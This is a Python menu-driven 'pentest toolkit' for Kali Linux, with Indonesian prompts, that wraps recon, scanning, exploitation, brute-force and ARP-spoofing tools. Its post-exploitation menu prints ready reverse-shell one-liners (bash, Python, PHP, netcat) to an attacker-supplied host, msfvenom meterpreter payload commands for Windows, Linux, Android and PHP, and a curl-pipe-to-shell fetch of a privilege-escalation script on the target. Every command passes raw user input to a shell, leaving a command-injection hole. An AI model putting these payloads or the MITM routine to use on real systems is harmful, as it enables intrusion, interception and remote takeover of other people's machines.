#!/usr/bin/env python3
import os
import sys
import subprocess
import time
from datetime import datetime

# Banner ASCII
def show_banner():
    print(r"""
██████╗ ██╗███████╗██╗  ██╗██╗ █████╗ ███████╗
██╔══██╗██║╚══███╔╝██║ ██╔╝██║██╔══██╗██╔════╝
██████╔╝██║  ███╔╝ █████╔╝ ██║███████║███████╗
██╔══██╗██║ ███╔╝  ██╔═██╗ ██║██╔══██║╚════██║
██║  ██║██║███████╗██║  ██╗██║██║  ██║███████║
╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
    """)
    print("="*60)
    print("RizkiAs Pentest Toolkit - Professional Edition")
    print("="*60)
    print(f"Time Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("")

# Fungsi untuk membersihkan layar
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

# Fungsi validasi input
def get_input(prompt, input_type=str, min_val=None, max_val=None):
    while True:
        try:
            user_input = input_type(input(prompt))
            if min_val is not None and user_input < min_val:
                raise ValueError(f"Minimal {min_val}")
            if max_val is not None and user_input > max_val:
                raise ValueError(f"Maksimal {max_val}")
            return user_input
        except ValueError as e:
            print(f"Input tidak valid: {e}")

# Kategori 1: Reconnaissance
def reconnaissance_menu():
    while True:
        clear_screen()
        print("\n[1] Reconnaissance Tools")
        print("="*40)
        print("1. Whois Lookup")
        print("2. DNS Lookup (nslookup)")
        print("3. Subdomain Enumeration (sublist3r)")
        print("4. Email & Subdomain Harvester (theHarvester)")
        print("5. Tech Stack Scanner (whatweb)")
        print("6. Directory Brute Force (dirsearch)")
        print("7. Simple Port Scan (nmap -sn)")
        print("8. Kembali ke Menu Utama")
        
        choice = get_input("Pilih opsi: ", int, 1, 8)
        
        if choice == 1:
            target = input("Masukkan domain/IP: ")
            subprocess.run(f"whois {target}", shell=True)
        
        elif choice == 2:
            target = input("Masukkan domain: ")
            subprocess.run(f"nslookup {target}", shell=True)
        
        elif choice == 3:
            domain = input("Masukkan domain: ")
            subprocess.run(f"sublist3r -d {domain} -o subdomains_{domain}.txt", shell=True)
            print(f"[+] Hasil disimpan di subdomains_{domain}.txt")
        
        elif choice == 4:
            domain = input("Masukkan domain: ")
            limit = input("Jumlah hasil (default 100): ") or "100"
            subprocess.run(f"theHarvester -d {domain} -l {limit} -b all -f results_{domain}", shell=True)
            print(f"[+] Hasil disimpan di results_{domain}.xml dan results_{domain}.txt")
        
        elif choice == 5:
            url = input("Masukkan URL: ")
            subprocess.run(f"whatweb {url}", shell=True)
        
        elif choice == 6:
            url = input("Masukkan URL: ")
            wordlist = input("Path wordlist (default /usr/share/dirb/wordlists/common.txt): ") or "/usr/share/dirb/wordlists/common.txt"
            subprocess.run(f"dirsearch -u {url} -w {wordlist}", shell=True)
        
        elif choice == 7:
            target = input("Masukkan target (IP/domain): ")
            subprocess.run(f"nmap -sn {target}", shell=True)
        
        elif choice == 8:
            return

        input("\nTekan Enter untuk melanjutkan...")

# Kategori 2: Scanning/Enumeration
def scanning_menu():
    while True:
        clear_screen()
        print("\n[2] Scanning & Enumeration Tools")
        print("="*40)
        print("1. Full Nmap Scan")
        print("2. Nikto Web Server Scan")
        print("3. WPScan (WordPress)")
        print("4. Gobuster Path Brute-force")
        print("5. Amass Advanced Recon")
        print("6. HTTPX Check Live Web")
        print("7. Kembali ke Menu Utama")
        
        choice = get_input("Pilih opsi: ", int, 1, 7)
        
        if choice == 1:
            target = input("Masukkan target (IP/domain): ")
            output = input("Nama output file (default: nmap_full.txt): ") or "nmap_full.txt"
            subprocess.run(f"nmap -sV -O -A -T4 {target} -oN {output}", shell=True)
            print(f"[+] Hasil disimpan di {output}")
        
        elif choice == 2:
            url = input("Masukkan URL: ")
            subprocess.run(f"nikto -h {url}", shell=True)
        
        elif choice == 3:
            url = input("Masukkan URL WordPress: ")
            subprocess.run(f"wpscan --url {url} --enumerate p", shell=True)
        
        elif choice == 4:
            url = input("Masukkan URL: ")
            wordlist = input("Path wordlist (default /usr/share/dirb/wordlists/common.txt): ") or "/usr/share/dirb/wordlists/common.txt"
            subprocess.run(f"gobuster dir -u {url} -w {wordlist}", shell=True)
        
        elif choice == 5:
            domain = input("Masukkan domain: ")
            subprocess.run(f"amass enum -d {domain} -o amass_{domain}.txt", shell=True)
            print(f"[+] Hasil disimpan di amass_{domain}.txt")
        
        elif choice == 6:
            file = input("Masukkan path file berisi domain: ")
            subprocess.run(f"httpx -l {file} -status-code -title", shell=True)
        
        elif choice == 7:
            return

        input("\nTekan Enter untuk melanjutkan...")

# Kategori 3: Exploitation
def exploitation_menu():
    while True:
        clear_screen()
        print("\n[3] Exploitation Tools")
        print("="*40)
        print("1. SQLMap (SQL Injection)")
        print("2. XSStrike (XSS)")
        print("3. Commix (Command Injection)")
        print("4. Hydra (Bruteforce Login)")
        print("5. WFuzz (Parameter Fuzzing)")
        print("6. Metasploit Framework")
        print("7. BurpSuite (Manual)")
        print("8. Kembali ke Menu Utama")
        
        choice = get_input("Pilih opsi: ", int, 1, 8)
        
        if choice == 1:
            url = input("Masukkan URL target: ")
            subprocess.run(f"sqlmap -u {url} --batch --risk=3 --level=5", shell=True)
        
        elif choice == 2:
            url = input("Masukkan URL target: ")
            subprocess.run(f"xssstrike -u {url}", shell=True)
        
        elif choice == 3:
            url = input("Masukkan URL target: ")
            subprocess.run(f"commix -u {url}", shell=True)
        
        elif choice == 4:
            target = input("Target (ssh://, ftp://, http://): ")
            username = input("Username (atau file): ")
            password_list = input("Path password list: ")
            service = input("Service (ssh, ftp, http-form-post, etc): ")
            subprocess.run(f"hydra -L {username} -P {password_list} {target} {service}", shell=True)
        
        elif choice == 5:
            url = input("Masukkan URL (gunakan FUZZ): ")
            wordlist = input("Path wordlist: ")
            subprocess.run(f"wfuzz -c -z file,{wordlist} --hc 404 {url}", shell=True)
        
        elif choice == 6:
            print("\n[!] Memulai Metasploit...")
            subprocess.run("msfconsole", shell=True)
        
        elif choice == 7:
            print("\n[!] Membuka BurpSuite...")
            subprocess.run("burpsuite &", shell=True)
        
        elif choice == 8:
            return

        input("\nTekan Enter untuk melanjutkan...")

# Kategori 4: Post-Exploitation
def post_exploitation_menu():
    while True:
        clear_screen()
        print("\n[4] Post-Exploitation Tools")
        print("="*40)
        print("1. Netcat Reverse Shell Helper")
        print("2. MSFVenom Payload Builder")
        print("3. Privilege Escalation Checker")
        print("4. Kembali ke Menu Utama")
        
        choice = get_input("Pilih opsi: ", int, 1, 4)
        
        if choice == 1:
            print("\n[ Netcat Reverse Shell ]")
            lhost = input("Local IP: ")
            lport = input("Local Port: ")
            print("\nPilih shell type:")
            print("1. Bash")
            print("2. Python")
            print("3. PHP")
            print("4. Netcat")
            
            shell_choice = get_input("Pilihan: ", int, 1, 4)
            shells = {
                1: f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
                2: f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                3: f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                4: f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
            }
            print(f"\n[+] Gunakan payload berikut:\n{shells[shell_choice]}")
            print(f"\n[!] Jalankan listener di local machine:\nnc -lnvp {lport}")
        
        elif choice == 2:
            print("\n[ MSFVenom Payload Generator ]")
            lhost = input("Local IP: ")
            lport = input("Local Port: ")
            print("\nPilih payload type:")
            print("1. Windows (exe)")
            print("2. Linux (elf)")
            print("3. Android (apk)")
            print("4. Web (php)")
            
            payload_choice = get_input("Pilihan: ", int, 1, 4)
            payloads = {
                1: f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > payload.exe",
                2: f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > payload.elf",
                3: f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > payload.apk",
                4: f"msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw > payload.php"
            }
            print(f"\n[+] Jalankan perintah berikut:\n{payloads[payload_choice]}")
            print("\n[!] Jangan lupa setup listener di Metasploit!")
        
        elif choice == 3:
            print("\n[ Privilege Escalation Checker ]")
            print("1. LinPeas (Linux)")
            print("2. WinPeas (Windows)")
            esc_choice = get_input("Pilihan: ", int, 1, 2)
            
            if esc_choice == 1:
                print("\n[!] Download dan jalankan di target:")
                print("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh")
            else:
                print("\n[!] Download dan jalankan di target:")
                print("Invoke-WebRequest https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -OutFile winpeas.bat")
        
        elif choice == 4:
            return

        input("\nTekan Enter untuk melanjutkan...")

# Kategori 5: Pelengkap/Jaringan
def network_menu():
    while True:
        clear_screen()
        print("\n[5] Network & Additional Tools")
        print("="*40)
        print("1. OWASP ZAP")
        print("2. ARP Spoofing + Wireshark")
        print("3. Ettercap (MITM)")
        print("4. Kembali ke Menu Utama")
        
        choice = get_input("Pilih opsi: ", int, 1, 4)
        
        if choice == 1:
            print("\n[!] Membuka OWASP ZAP...")
            subprocess.run("zap.sh &", shell=True)
        
        elif choice == 2:
            print("\n[ ARP Spoofing + Packet Sniffing ]")
            target = input("Target IP: ")
            gateway = input("Gateway IP: ")
            interface = input("Network Interface (eth0/wlan0): ") or "eth0"
            
            print("\n[!] Memulai ARP spoofing...")
            subprocess.Popen(f"arpspoof -i {interface} -t {target} {gateway}", shell=True)
            subprocess.Popen(f"arpspoof -i {interface} -t {gateway} {target}", shell=True)
            
            print("[!] Memulai Wireshark...")
            subprocess.Popen(f"wireshark -i {interface} -k", shell=True)
            print("\n[!] Tekan Ctrl+C di terminal ini untuk menghentikan serangan")
            
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[!] Menghentikan serangan...")
                subprocess.run("pkill arpspoof", shell=True)
        
        elif choice == 3:
            print("\n[!] Memulai Ettercap (MITM)...")
            interface = input("Network Interface (eth0/wlan0): ") or "eth0"
            target = input("Target IP (format: IP/MAC): ")
            gateway = input("Gateway IP (format: IP/MAC): ")
            subprocess.run(f"ettercap -T -i {interface} -M arp:remote /{gateway}// /{target}//", shell=True)
        
        elif choice == 4:
            return

        input("\nTekan Enter untuk melanjutkan...")

# Main Menu
def main():
    while True:
        clear_screen()
        show_banner()
        print(" Main Menu ".center(60, "="))
        print("1. Reconnaissance Tools")
        print("2. Scanning & Enumeration")
        print("3. Exploitation Tools")
        print("4. Post-Exploitation")
        print("5. Network & Additional Tools")
        print("6. Exit")
        print("="*60)
        
        choice = get_input("\nPilih kategori: ", int, 1, 6)
        
        if choice == 1:
            reconnaissance_menu()
        elif choice == 2:
            scanning_menu()
        elif choice == 3:
            exploitation_menu()
        elif choice == 4:
            post_exploitation_menu()
        elif choice == 5:
            network_menu()
        elif choice == 6:
            print("\n[!] Keluar dari RizkiAs Toolkit...")
            sys.exit(0)

if __name__ == "__main__":
    # Cek environment Kali Linux
    if not os.path.exists('/etc/os-release'):
        print("[ERROR] Tools ini harus dijalankan di Kali Linux")
        sys.exit(1)
    
    with open('/etc/os-release') as f:
        if 'Kali' not in f.read():
            print("[ERROR] Tools ini dirancang khusus untuk Kali Linux")
            sys.exit(1)
    
    # Cek akses root
    if os.geteuid() != 0:
        print("[ERROR] Tools ini membutuhkan akses root!")
        print("Jalankan dengan: sudo ./RizkiAs.py")
        sys.exit(1)
    
    main()
